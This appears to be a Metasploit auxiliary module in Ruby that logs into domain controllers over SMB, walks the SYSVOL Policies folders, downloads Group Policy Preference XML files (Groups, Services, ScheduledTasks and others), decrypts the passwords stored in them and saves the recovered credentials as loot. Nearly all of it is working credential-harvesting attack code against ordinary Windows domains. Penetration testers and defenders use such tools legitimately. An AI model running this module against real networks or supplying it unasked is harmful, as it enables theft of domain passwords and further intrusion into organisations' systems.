##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex/parser/group_policy_preferences'

class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::SMB
  include Msf::Exploit::Remote::SMB::Client::Authenticated
  include Msf::Exploit::Remote::DCERPC

  # Exploit mixins should be called first
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  # Aliases for common classes
  SIMPLE = Rex::Proto::SMB::Client
  XCEPT  = Rex::Proto::SMB::Exceptions
  CONST  = Rex::Proto::SMB::Constants

  def initialize
    super(
      'Name'        => 'SMB Group Policy Preference Saved Passwords Enumeration',
      'Description' => %Q{
        This module enumerates files from target domain controllers and
        connects to them via SMB. It then looks for Group Policy Preference XML
        files containing local/domain user accounts and passwords and decrypts them
        using Microsofts public AES key.

        Tested on Win2k8 R2 DC.
      },
      'Author'      =>
        [
          'Joshua D. Abraham <jabra[at]praetorian.com>',
        ],
      'References'    =>
        [
          ['URL', 'http://msdn.microsoft.com/en-us/library/cc232604(v=prot.13)'],
          ['URL', 'http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html'],
          ['URL', 'http://blogs.technet.com/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx'],
          ['URL', 'https://labs.portcullis.co.uk/blog/are-you-considering-using-microsoft-group-policy-preferences-think-again/'],
          ['MSB', 'MS14-025']
        ],
      'License'     => MSF_LICENSE
    )
    register_options([
      OptString.new('SMBSHARE', [true, 'The name of the share on the server', 'SYSVOL']),
      OptString.new('RPORT', [true, 'The Target port', 445]),
      OptBool.new('STORE', [false, 'Store the enumerated files in loot.', true]),
    ], self.class)
  end

  def check_path(ip,path)
    vprint_status("Trying to download \\\\#{ip}\\#{path}...")
    begin
      if (fd = simple.open("\\#{path}", 'ro'))
        fd.close
        print_good "Found Policy Share on #{ip}"
        smb_download(ip,path)
      end
    rescue ::Rex::Proto::SMB::Exceptions::ErrorCode => e
      case e.get_error(e.error_code)
      when "STATUS_FILE_IS_A_DIRECTORY"
        print_good("Directory FOUND: \\\\#{ip}\\#{datastore['SMBSHARE']}\\#{path}")
      when "STATUS_OBJECT_NAME_NOT_FOUND"
        vprint_error("Object \\\\#{ip}\\#{datastore['SMBSHARE']}\\#{path} NOT found!")
      when "STATUS_OBJECT_PATH_NOT_FOUND"
        vprint_error("Object PATH \\\\#{ip}\\#{datastore['SMBSHARE']}\\#{path} NOT found!")
      when "STATUS_ACCESS_DENIED"
       vprint_error("Host #{ip} reports access denied.")
      when "STATUS_BAD_NETWORK_NAME"
        vprint_error("Host #{ip} is NOT connected to #{datastore['SMBDomain']}!")
      when "STATUS_INSUFF_SERVER_RESOURCES"
        vprint_error("Host #{ip} rejected with insufficient resources!")
      when "STATUS_OBJECT_NAME_INVALID"
        vprint_error("opening \\#{path} bad filename")
      else
        return
      end
    end
  end

  def report_creds(ip,user, password, disabled)
    service_data = {
      address: ip,
      port: rport,
      protocol: "tcp",
      service_name: "smb",
      workspace_id: myworkspace_id
    }

    new_user = user.sub(/\s+.*/,'')
    first, rest = new_user.split(/\\/)
    if first and rest
        domain = first
        user = rest
        credential_data = {
            origin_type: :service,
            module_fullname: fullname,
            username: user,
            private_data: password,
            private_type: :password,
            realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
            realm_value: domain,
        }
    else
        credential_data = {
            origin_type: :service,
            module_fullname: fullname,
            username: new_user,
            private_data: password,
            private_type: :password
        }
    end
    credential_core = create_credential(credential_data.merge(service_data))

    login_data = {
      core: credential_core,
      access_level: "User",
      status: Metasploit::Model::Login::Status::UNTRIED
    }

    create_credential_login(login_data.merge(service_data))
  end

  def parse_xml(ip,path,xmlfile)
    mxml = xmlfile[:xml]
    print_status "Parsing file: \\\\#{ip}\\#{datastore['SMBSHARE']}\\#{path}"
    filetype = File.basename(xmlfile[:path].gsub("\\","/"))
    results = Rex::Parser::GPP.parse(mxml)
    tables = Rex::Parser::GPP.create_tables(results, filetype, xmlfile[:domain], xmlfile[:dc])
    tables.each do |table|
      print_good table.to_s
    end
    results.each do |result|
      if datastore['STORE']
          stored_path = store_loot('windows.gpp.xml', 'text/plain',ip, xmlfile[:xml], filetype, xmlfile[:path])
          print_status("XML file saved to: #{stored_path}")
      end

      report_creds(ip,result[:USER], result[:PASS], result[:DISABLED])
    end

  end

  def smb_download(ip,path)
    vprint_status("Downloading #{path}...")
    data = ''
    begin
      fd = simple.open("\\#{path}", 'ro')
      data = fd.read
      fd.close
    end
    spath = path.split('\\')
    retobj = {
        :dc     => ip,
        :path   => path,
        :xml    => data
      }
    retobj[:domain] = spath[1]

    parse_xml(ip,path,retobj) if retobj

    fname = path.split("\\")[-1]
    if datastore['STORE']
        path = store_loot("smb.shares.file", "application/octet-stream",ip, data, fname)
        print_good("#{fname} saved as: #{path}")
    end
  end

  def run_host(ip)
    print_status("Connecting to the server...")
    begin
      connect()
      smb_login()
      print_status("Mounting the remote share \\\\#{ip}\\#{datastore['SMBSHARE']}'...")
      self.simple.connect("\\\\#{ip}\\#{datastore['SMBSHARE']}")

      root_listing = self.simple.client.find_first("*")
      corpdomain = ''
      root_listing.each_pair do |key,val|
        next if key == '.' or key == '..'
        corpdomain = key
      end

      subfolder_listing = self.simple.client.find_first("#{corpdomain}\\Policies\\*")
      subfolders = []
      subfolder_listing.each_pair do |key,val|
        next if key == '.' or  key == '..'
        subfolders << key
      end

      subfolders.each do |i|
        i = "#{corpdomain}\\Policies\\#{i}"
        check_path(ip,"\\#{i}\\MACHINE\\Preferences\\Groups\\Groups.xml")
        check_path(ip,"\\#{i}\\USER\\Preferences\\Groups\\Groups.xml")
        check_path(ip,"\\#{i}\\MACHINE\\Preferences\\Services\\Services.xml")
        check_path(ip,"\\#{i}\\USER\\Preferences\\Printers\\Printers.xml")
        check_path(ip,"\\#{i}\\USER\\Preferences\\Drives\\Drives.xml")
        check_path(ip,"\\#{i}\\MACHINE\\Preferences\\Datasources\\DataSources.xml")
        check_path(ip,"\\#{i}\\USER\\Preferences\\Datasources\\DataSources.xml")
        check_path(ip,"\\#{i}\\MACHINE\\Preferences\\ScheduledTasks\\ScheduledTasks.xml")
        check_path(ip,"\\#{i}\\USER\\Preferences\\ScheduledTasks\\ScheduledTasks.xml")
      end

      disconnect

    rescue ::Exception => e
      print_error("#{rhost}: #{e.class} #{e}")
    ensure
      disconnect
    end
  end
end
